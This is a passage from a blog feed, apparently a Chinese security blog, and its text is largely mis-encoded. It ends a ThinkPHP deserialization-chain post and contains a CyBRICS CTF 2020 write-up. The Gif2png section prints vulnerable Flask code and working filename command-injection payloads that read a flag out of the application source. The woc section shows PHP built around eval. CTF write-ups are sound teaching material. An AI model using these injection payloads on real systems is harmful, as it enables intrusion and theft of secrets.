[&quot;wh1t3p1g&quot;=&gt;&quot;whoami&quot;])</code>.è¿™æ˜¯ä¸€ç§åˆæ³•è°ƒç”¨ã€‚</p><p>å°ç»“ä¸‹ã€‚tpæ‰€æœ‰ç³»åˆ—ååºåˆ—åŒ–é“¾å°±è¿™ä¹ˆå¤šäº†ã€‚å¤§ä½“ä¸Šæ€è·¯éƒ½æ˜¯ä¸€æ ·çš„ã€‚åªæœ‰5.0ç‰ˆæœ¬æ˜¯è¾ƒä¸ºå¤æ‚çš„å†™æ–‡ä»¶ã€‚å…¶ä»–ç‰ˆæœ¬éƒ½å¯ä»¥ç›´æ¥rce.é­”æœ¯æ–¹æ³•ä¹ŸåŸºæœ¬éƒ½æ˜¯<code>destructï¼ŒtoString,call</code>è°ƒç”¨ã€‚å…¶ä¸­5.2,6.0æ˜¯æ²¡æœ‰callçš„å¿…è¦çš„ã€‚</p><h2 id="tp6-0ä»»æ„æ–‡ä»¶å†™"><a href="#tp6-0ä»»æ„æ–‡ä»¶å†™" class="headerlink" title="tp6.0ä»»æ„æ–‡ä»¶å†™"></a>tp6.0ä»»æ„æ–‡ä»¶å†™</h2><p>è¿™ä¸ªæ´å…¶å®æ²¡å¿…è¦è·Ÿäº†ã€‚å°±æ˜¯å¹´åichunqiuæˆ˜ç–«æ¯”èµ›æ—¶å‡ºç°è¿‡çš„æ´ã€‚sessionå¯ä»¥æ›´æ”¹æˆ32ä½<code>.php</code>åç¼€ã€‚ç„¶åå¦‚æœsessionå†…å®¹å¯æ§çš„è¯å°±ç›¸å½“äºå†™äº†shell.è¿™ä¸ªè¿˜æ˜¯æ¯”è¾ƒå¸¸è§çš„ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ²¡æƒ³åˆ°çœŸçš„è¿˜æ˜¯æŠŠè¿™ä¸ªé¡¹ç›®çš„å†…å®¹éƒ½è·Ÿå®Œäº†ã€‚ä¸å¾—ä¸è¯´ç†è§£äº†ä¸€äº›åŸç†åä¹Ÿå°±å¯¹tpç³»åˆ—payloadçš„æ„é€ æœ‰äº†æ›´æ·±çš„ç†è§£ã€‚è™½ç„¶å¤§éƒ¨åˆ†å®æˆ˜ä¸­é»‘ç›’åŸºæœ¬æµ‹ä¸å‡ºæ¥å°±æ˜¯äº†ã€‚</p><p>ä¸‹ä¸€æ­¥åœ¨è€ƒè™‘æ˜¯å»çœ‹çœ‹laravelè¿˜æ˜¯javaçš„å‡ ä¸ªååºåˆ—åŒ–é“¾å­ã€‚åŠ æ²¹å§</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CyBRICS-CTF 2020</title>
      <link href="2020/07/26/CyBRICS-CTF-2020/"/>
      <url>2020/07/26/CyBRICS-CTF-2020/</url>
      
        <content type="html"><![CDATA[<p>Cybricsæ¯”èµ›æ„Ÿè§‰éƒ½æ²¡é˜Ÿå‹åœ¨æ‰“â€¦â€¦ç®€å•è®°å½•ä¸‹åšçš„å‡ é“é¢˜</p><a id="more"></a><h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>ç­¾åˆ°ä¸è°ˆã€‚<br><img src="/2020/07/26/CyBRICS-CTF-2020/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="Gif2png"><a href="#Gif2png" class="headerlink" title="Gif2png"></a>Gif2png</h2><p>é¦–å…ˆæ˜¯æºç å®¡è®¡.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, flash, send_from_directory</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> filetype</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'gif'</span>&#125;</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'********************************'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">500</span> * <span class="number">1024</span>  <span class="comment"># 500Kb</span></span><br><span class="line">ffLaG = <span class="string">"cybrics&#123;********************************&#125;"</span></span><br><span class="line">Bootstrap(app)</span><br><span class="line">logging.getLogger().setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    logging.debug(request.headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            logging.debug(<span class="string">'No file part'</span>)</span><br><span class="line">            flash(<span class="string">'No file part'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        file = request.files[<span class="string">'file'</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">            logging.debug(<span class="string">'No selected file'</span>)</span><br><span class="line">            flash(<span class="string">'No selected file'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> allowed_file(file.filename):</span><br><span class="line">            logging.debug(<span class="string">f'Invalid file extension of file: <span class="subst">&#123;file.filename&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Invalid file extension'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> file.content_type != <span class="string">"image/gif"</span>:</span><br><span class="line">            logging.debug(<span class="string">f'Invalid Content type: <span class="subst">&#123;file.content_type&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Content type is not "image/gif"'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bool(re.match(<span class="string">"^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$"</span>, file.filename)) <span class="keyword">or</span> <span class="string">".."</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">            logging.debug(<span class="string">f'Invalid symbols in filename: <span class="subst">&#123;file.content_type&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Invalid filename'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], file.filename))</span><br><span class="line"></span><br><span class="line">            mime_type = filetype.guess_mime(<span class="string">f'uploads/<span class="subst">&#123;file.filename&#125;</span>'</span>)</span><br><span class="line">            <span class="keyword">if</span> mime_type != <span class="string">"image/gif"</span>:</span><br><span class="line">                logging.debug(<span class="string">f'Invalid Mime type: <span class="subst">&#123;mime_type&#125;</span>'</span>)</span><br><span class="line">                flash(<span class="string">'Mime type is not "image/gif"'</span>, <span class="string">'danger'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">            uid = str(uuid.uuid4())</span><br><span class="line">            os.mkdir(<span class="string">f"uploads/<span class="subst">&#123;uid&#125;</span>"</span>)</span><br><span class="line"></span><br><span class="line">            logging.debug(<span class="string">f"Created: <span class="subst">&#123;uid&#125;</span>. Command: ffmpeg -i 'uploads/<span class="subst">&#123;file.filename&#125;</span>' \"uploads/<span class="subst">&#123;uid&#125;</span>/%03d.png\""</span>)</span><br><span class="line"></span><br><span class="line">            command = subprocess.Popen(<span class="string">f"ffmpeg -i 'uploads/<span class="subst">&#123;file.filename&#125;</span>' \"uploads/<span class="subst">&#123;uid&#125;</span>/%03d.png\""</span>, shell=<span class="literal">True</span>)</span><br><span class="line">            command.wait(timeout=<span class="number">15</span>)</span><br><span class="line">            logging.debug(command.stdout)</span><br><span class="line"></span><br><span class="line">            flash(<span class="string">'Successfully saved'</span>, <span class="string">'success'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'result'</span>, uid=uid))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"form.html"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/result/&lt;uid&gt;/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span><span class="params">(uid)</span>:</span></span><br><span class="line">    images = []</span><br><span class="line">    <span class="keyword">for</span> image <span class="keyword">in</span> os.listdir(<span class="string">f"uploads/<span class="subst">&#123;uid&#125;</span>"</span>):</span><br><span class="line">        mime_type = filetype.guess(str(Path(<span class="string">"uploads"</span>) / uid / image))</span><br><span class="line">        <span class="keyword">if</span> image.endswith(<span class="string">".png"</span>) <span class="keyword">and</span> mime_type <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> mime_type.EXTENSION == <span class="string">"png"</span>:</span><br><span class="line">            images.append(image)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"result.html"</span>, uid=uid, images=images)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/uploads/&lt;uid&gt;/&lt;image&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">image</span><span class="params">(uid, image)</span>:</span></span><br><span class="line">    logging.debug(request.headers)</span><br><span class="line">    dir = str(Path(app.config[<span class="string">'UPLOAD_FOLDER'</span>]) / uid)</span><br><span class="line">    print(dir)</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(dir, image)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(413)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_entity_too_large</span><span class="params">(error)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"File is too large"</span>, <span class="number">413</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'localhost'</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°æ‰§è¡Œffmpegæœ‰ä¸ªå˜é‡æ‹¼æ¥ã€‚æˆ‘ä»¬çš„file.filenameå¯æ§ã€‚ä¸è¿‡éœ€è¦ç»è¿‡å‰é¢å‡ å±‚æ£€éªŒã€‚ç®€å•çœ‹å¯ä»¥å‘ç°ä¸€æ–¹é¢é™åˆ¶äº†<br>åç¼€ï¼ˆå–æœ€åä¸€ä¸ª. åå­—ç¬¦æ£€æµ‹æ˜¯å¦ä¸ºgifï¼‰å¦å¤–é™åˆ¶äº†å¯ç”¨å­—ç¬¦ã€‚ä¸è¿‡è¿™äº›å­—ç¬¦å·²ç»å¤Ÿç”¨äº†ã€‚</p><p>é¦–å…ˆæˆ‘çš„æ€è·¯æ˜¯å»æ‰¾ffmpegçš„å¯ç”¨flag.é€šè¿‡<code>-h</code>åˆ—å‡ºä¸€äº›flagåã€‚æˆ‘æ³¨æ„åˆ°è¿™æ ·å‡ ä¸ª</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-report             generate a report</span><br><span class="line">-filter_script filename  <span class="built_in">read</span> stream filtergraph description from a file</span><br><span class="line">-metadata string=string  add metadata</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä¸»è¦æ˜¯å¯»æ‰¾è·Ÿæ–‡ä»¶æœ‰å…³çš„é€‰é¡¹ã€‚å…¶ä¸­reportä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ªlogæ–‡ä»¶ã€‚filter_scriptå¯ä»¥è¯»å–ä¸€ä¸ªæ–‡ä»¶å†…å®¹ä½œä¸ºstream filter. -metadata å¯ä»¥æ·»åŠ ä¸€ç»„é”®å€¼ã€‚åŠ å…¥åˆ°è¾“å‡ºçš„metadataä¸­ã€‚</p><p>ä¸è¿‡æœ¬åœ°è·‘èµ·æ¥ç®€å•å°è¯•ä¸‹åã€‚ä¼šå‘ç°å› ä¸ºæˆ‘ä»¬ä¸å¯ç”¨<code>/</code>å­—ç¬¦ã€‚æ‰€ä»¥æƒ³è¦æ§åˆ¶è·¯å¾„æ˜¯åšä¸åˆ°çš„ã€‚æˆ‘ä»¬å¿…é¡»è¦è®©åŒ…å«flagçš„ä¿¡æ¯è¾“å‡ºåˆ°uploadsçš„æ²™ç›’ä¸‹ã€‚è€Œæ³¨æ„åˆ°é¢˜ç›®<code>/uploads/{uid}/</code>ä¸‹çš„å†…å®¹å¹¶æ²¡æœ‰åƒå…¶ä»–ä¸¤ä¸ªè·¯ç”±é‚£æ ·åšæ–‡ä»¶ç±»å‹æ£€æŸ¥ã€‚æ‰€ä»¥æˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥è®¿é—®çš„ã€‚</p><p>å› æ­¤<code>-report</code>æ— æ³•ä½¿ç”¨ã€‚å› ä¸ºå®ƒåªèƒ½åœ¨å½“å‰ç›®å½•ç”ŸæˆæŠ¥å‘Šã€‚è€Œ<code>-filter_script</code>å‡å¦‚æ­é…<code>-report</code>å€’æ˜¯å¯ä»¥æŠŠè¯»å–æ–‡ä»¶å†…å®¹æ—¶çš„é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°æ—¥å¿—ä¸­ã€‚ä½†æ˜¯å› ä¸ºæ—¥å¿—è¯»ä¸äº†æ‰€ä»¥ä¹Ÿä¸å¯è¡Œã€‚</p><p>äºæ˜¯æˆ‘å…³æ³¨ç‚¹å°±é›†ä¸­åˆ°äº†<code>-metadata</code>ä¸Šã€‚æˆ‘ä»¬å¯ä»¥æ„é€ è¿™æ ·çš„å‘½ä»¤é—­åˆå¼•å·å¹¶ä¸”æ‰§è¡Œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i <span class="string">'uploads/logo.gif'</span> -metadata language=$(cat main.py| grep ffLaG |base64)  -metadata abc=<span class="string">'.gif'</span> <span class="string">"uploads/&#123;uid&#125;/%03d.png"</span></span><br></pre></td></tr></table></figure><p>ä»è¾“å‡ºç»“æœä¸Šçœ‹æ˜¯æˆåŠŸæ‰§è¡Œå‘½ä»¤äº†çš„ã€‚ä½†æ˜¯æœ¬åœ°æµ‹è¯•å‘ç°ä¸€ä¸ªé—®é¢˜ã€‚è¾“å‡ºçš„pngè¯»ä¸åˆ°å…¶metadataå±æ€§ã€‚</p><p>ç®€å•çš„æŸ¥é˜…äº†ä¸‹æ–‡æ¡£ä»¥åŠè°·æ­Œåæˆ‘æ¨æµ‹åº”è¯¥æ˜¯å› ä¸ºffmpegçš„metadataé€‰é¡¹ä¸æ”¯æŒpng.ä¸è¿‡æ–‡æ¡£é‡Œæˆ‘å‘ç°è§†é¢‘æ–‡ä»¶æ˜¯è‚¯å®šå¯ä»¥ä¿®æ”¹å¢åŠ metadataçš„ã€‚å› æ­¤å½“æˆ‘å°è¯•å°†ä¸Šé¢çš„å‘½ä»¤æ”¹ä¸ºè¾“å‡ºæˆaviåã€‚æ˜¯å¯ä»¥é€šè¿‡exiftoolè¯»å–åˆ°metadataä¸­çš„languageçš„ã€‚<br><img src="/2020/07/26/CyBRICS-CTF-2020/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨åªéœ€è¦ä¸€ä¸ªå¼ºè¿«è½¬æ¢è¾“å‡ºç±»å‹çš„flag. å†æ¬¡æŸ¥æ–‡æ¡£å‘ç°äº†<code>-f fmt              force format</code>ã€‚<br>æ‰€ä»¥æœ€ç»ˆpayloadå¦‚ä¸‹ã€‚æˆ‘ä»¬åªéœ€åœ¨ä¼ å¥½logo.gifåä¼ gifæ–‡ä»¶å¹¶ä»¥å¦‚ä¸‹ä½œä¸ºæ–‡ä»¶å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logo.gif<span class="string">' -metadata language=$(cat main.py| grep ffLaG |base64) -f avi  -metadata abc='</span>.gif</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬ä¿è¯äº†ç»“å°¾æœ€åçš„<code>.</code>æœ«å°¾æ˜¯<code>gif</code>ç»•è¿‡åç¼€æ£€æŸ¥ã€‚ä¹‹åæ‰§è¡Œå‘½ä»¤æ—¶å°†ä¼šæŠŠmain.pyä¸­çš„ffLaGå˜é‡å€¼ä¿å­˜åˆ°è¾“å‡ºçš„language metadataä¸­ã€‚æœ¬åœ°è·‘èµ·æ¥çš„è¯ã€‚ä¼šå‘ç°åœ¨æ²™ç›’ä¸‹æœ€ç»ˆç”Ÿæˆäº†åä¸º<code>%03d.png</code>çš„aviç±»å‹æ–‡ä»¶ã€‚å¹¶ä¸”å¯ä»¥ç”¨exiftoolè·å–åˆ°å…¶metadataã€‚</p><p>æœ¬åœ°æ‰“é€šçš„è¯å»è¿œç¨‹æ‰“è‚¯å®šå°±æ²¡é—®é¢˜äº†ã€‚è¿™é‡Œæ‰“è¿œç¨‹æ—¶ç¨å¾®å¤šå‘äº†å‡ æ¬¡åŒ…ã€‚æœ€ç»ˆè·å–åˆ°å›¾ç‰‡å¹¶å¾—åˆ°flag<br><img src="/2020/07/26/CyBRICS-CTF-2020/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>çœ‹ç€è¿™ä¸ªflagæˆ‘é«˜åº¦æ€€ç–‘è‡ªå·±ä¸æ˜¯é¢„æœŸåšçš„â€¦â€¦æä¸å¥½å¯ä»¥å¾ˆç®€å•è§£å†³æ‰ã€‚</p><p>ps:<br>ä½›äº†ã€‚ä¸ä¼šå°±æˆ‘å»çœ‹ffmpegçš„flagsäº†å§â€¦â€¦è™½ç„¶åšæ³•å¾ˆæœ‰è¶£ä½†æ˜¯æœªå…å¤ªå‚»äº†â€¦â€¦åˆ«äººçš„payload:<br><code>&#39;$(cp main.py uploads$(pwd | cut -c1)GENERATED_UID$(pwd | cut -c1))&#39;.gif</code><br>wtcltclã€‚å¿˜è®°ç”¨pwdæ‹¼æ¥ç›®å½•äº†ã€‚bash scriptéƒ½ç™½å†™äº†ã€‚</p><h2 id="woc"><a href="#woc" class="headerlink" title="woc"></a>woc</h2><p>è¿™é“é¢˜ç›®æœ€ä¸»è¦çš„å°±æ˜¯ç”¨ä»£ç æ··æ·†è§†çº¿ã€‚æ‰€ä»¥å…³é”®åœ¨äºä¸€å®šè¦æ‰¾åˆ°çœŸæ­£å¯ä»¥åˆ©ç”¨çš„æ¼æ´ä»£ç ã€‚<br>é¦–å…ˆæ³¨æ„åˆ°ä¸€ä¸ªä¼¼ä¹å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ã€‚åœ¨calc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!@$_SESSION[<span class="string">'userid'</span>]) &#123;</span><br><span class="line">    redir(<span class="string">"."</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (!@$_GET[<span class="string">'template'</span>]) &#123;</span><br><span class="line">    redir(<span class="string">"."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$userid = $_SESSION[<span class="string">'userid'</span>];</span><br><span class="line">$template = $_GET[<span class="string">'template'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'#^[a-f0-9]&#123;8&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;12&#125;$#s'</span>, $template)) &#123;</span><br><span class="line">    redir(<span class="string">"."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!is_file(<span class="string">"calcs/$userid/templates/$template.html"</span>)) &#123;</span><br><span class="line">    redir(<span class="string">"."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (trim(@$_POST[<span class="string">'field'</span>])) &#123;</span><br><span class="line">    $field = trim($_POST[<span class="string">'field'</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s'</span>, $field)) &#123;</span><br><span class="line">        $value = <span class="string">"BAD"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (@$_POST[<span class="string">'share'</span>]) &#123;</span><br><span class="line">            $calc = uuid();</span><br><span class="line">            file_put_contents(<span class="string">"calcs/$userid/$calc.php"</span>, <span class="string">"&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n"</span> . file_get_contents(<span class="string">"inc/calclib.html"</span>) . file_get_contents(<span class="string">"calcs/$userid/templates/$template.html"</span>));</span><br><span class="line">            redir(<span class="string">"?p=sharelink&amp;calc=$calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                $value = <span class="keyword">eval</span>(<span class="string">"return $field;"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable $e) &#123;</span><br><span class="line">                $value = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($value) &amp;&amp; !is_string($value)) &#123;</span><br><span class="line">                $value = <span class="string">"ERROR"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $value = (string)$value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;var preloadValue = "</span> . json_encode($value) . <span class="string">";&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">"inc/calclib.html"</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">"calcs/$userid/templates/$template.html"</span>;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æƒ³æ³•è‚¯å®šæ˜¯åˆ©ç”¨é‚£ä¸ªeval.ä¸è¿‡è¿™é‡Œå­—ç¬¦å®åœ¨æ˜¯å¤ªé™åˆ¶äº†ã€‚æˆ‘å¾ˆå¿«å°±å‘ç°æ ¹æœ¬æ— æ³•æ„é€ å‡º<code>INF</code>,<code>NAN</code>ä»¥å¤–ç­‰ç­‰å­—ç¬¦å¹¶å–å•ã€‚å› æ­¤å¾—å°è¯•å˜åŒ–æ€è·¯ã€‚</p><p>æ³¨æ„åˆ°é¢˜ç›®åŠŸèƒ½ã€‚æ•´ä½“ä¸Šæä¾›äº†ä¸€ä¸ªå‡æ³¨å†Œç™»å½•åŠŸèƒ½ç”¨æ¥è®°å½•session.åŒæ—¶å…è®¸æˆ‘ä»¬ä¸Šä¼ æ–°template.æˆ‘ä»¬å¯ä»¥æ ¹æ®calc.phpä¸­æ‰€ä¼ 